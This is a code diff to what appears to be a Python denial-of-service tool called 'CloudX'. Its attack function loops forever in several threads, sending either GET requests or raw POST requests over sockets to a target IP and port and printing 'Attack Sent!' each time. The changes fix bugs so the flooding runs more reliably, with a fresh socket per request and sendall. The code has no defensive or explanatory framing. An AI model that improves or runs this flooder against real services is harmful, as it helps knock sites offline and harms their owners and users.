@@ -87,24 +87,22 @@ USER_AGENT_PARTS = {
 }
 
 def attack(ip, port, threadNum):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    request = urllib.request.Request(url, None, headers)
     while True:
         try:
             if method == "GET":
-                urlsocket_file = urllib.request.urlopen(request)
+                urlsocket_file = urllib.request.urlopen(url)
                 print("[*] Thread (%s) | Attack Sent!" % (threadNum))
             else:
-                s.connect((ip, int(port)))
-                payload = ("POST /%s HTTP/1.1\r\n" % (url)).encode('utf-8')
-                payload += ("Host: %s\r\n" % (url)).encode('utf-8')
-                payload += "Content-Length: 0\r\n".encode('utf-8')
-                payload += "\r\n".encode('utf-8')
-                s.sendto(payload, (ip, int(port)))
-                s.close()
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    s.connect((ip, int(port)))
+                    payload = ("POST /%s HTTP/1.1\r\n" % (url)).encode('utf-8')
+                    payload += ("Host: %s\r\n" % (url)).encode('utf-8')
+                    payload += "Content-Length: 0\r\n".encode('utf-8')
+                    payload += "\r\n".encode('utf-8')
+                    s.sendall(payload)
                 print("[*] Thread (%s) | Attack Sent!" % (threadNum))
         except urllib.error.URLError as e:
-            print("[*] Thread (%s) | Error! seems like CloudX can't reach the target URL!" % (threadNum))
+            print("[*] Thread (%s) | Error! CloudX can't reach the target URL!" % (threadNum))
             print("[*] Thread (%s) | Attack stopped." % (threadNum))
             break
 
